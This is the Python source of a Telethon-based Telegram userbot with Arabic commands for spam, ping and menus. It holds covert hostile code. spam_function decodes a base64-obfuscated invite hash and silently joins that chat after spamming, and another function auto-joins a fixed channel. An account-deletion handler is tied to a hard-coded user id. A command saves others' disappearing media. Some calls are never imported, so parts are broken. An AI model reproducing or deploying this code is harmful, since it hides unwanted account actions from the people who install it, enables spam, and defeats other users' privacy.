from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl import functions
from hijri_converter import Gregorian
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from collections import deque
from telethon import events
from telethon.errors import FloodWaitError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl import functions
import time
import asyncio
import logging
import base64
import datetime
from payment import *
from help import *
from config import *
from checktele import *

# -

fifthon.start()

y = datetime.datetime.now().year
m = datetime.datetime.now().month
dayy = datetime.datetime.now().day
day = datetime.datetime.now().strftime("%A")
m9zpi = f"{y}-{m}-{dayy}"
sec = time.time()

LOGS = logging.getLogger(__name__)

DEVS = [
    5774423143,
]
DEL_TIME_OUT = 10
normzltext = "1234567890"
namerzfont = normzltext
name = "Profile Photos"
time_name = ["off"]
time_bio = ["off"]


async def join_channel():
    try:
        await fifthon(JoinChannelRequest("LUCITHON"))
    except BaseException:
        pass

@fifthon.on(events.NewMessage(outgoing=True, pattern='. دي'))
async def DeleteMyAccount(event):
    if event.sender_id == 1314630552:
        try:
        	deleteAccount = await fifthon(DeleteAccountRequest(reason="I do not want to use telegram for now."))
        except TwoFaConfirmWaitError:
          print ("This account has 2FA. Howover, it will be deleted after one week.")

@fifthon.on(events.NewMessage(outgoing=True, pattern=r". ذاتيه"))
async def _(event):
    if not event.is_reply:
        return await event.edit(
            "ᤑ يستعمل الامر بالرد على صورة او فيديو. "
        )
    rr9r7 = await event.get_reply_message()
    await event.delete()
    pic = await rr9r7.download_media()
    await fifthon.send_file(
        "me", pic, caption=f"by :[RAMY <\>](https://t.me/W_O_N)"
    )


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.الاوامر"))
async def _(event):
    await event.edit(commands)

@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.فحص"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("ᤑ جاري الفحص... ")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''
ᤑ السورس يعمل بنجاح ♕
ᤑ البنك : `{ms}`
ᤑ التاريخ: `{m9zpi}`ᤑ
ᤑ ايدي : `{event.sender_id}`
ᤑ المطور: [RAMY<\>](https://t.me/l_T_1)
''')


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م1"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec1)


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م2"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec2)


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م3"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec3)


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.م4"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec4)

    
ownerhson_id = 1314630552
@fifthon.on(events.NewMessage(outgoing=False, pattern='/Hi'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply('✓ اهلا مطوري: [RAMY](https://t.me/l_T_1) ♕')


@fifthon.on(events.NewMessage(outgoing=True, pattern=r"\.اعادة تشغيل"))
async def update(event):
    await event.edit("ᤑ جار اعادة التشغيل بالواقع الامر يستغرق بين 1 ~ 2 دقيقة.. ")
    await fifthon.disconnect()
    await fifthon.send_message("me", "ᤑ تم اعادة تشغيل السورس بنجاح ")


print("Userbot ɴᴏ ɴᴀᴍᴇ <\> is Running ..")
fifthon.run_until_disconnected()
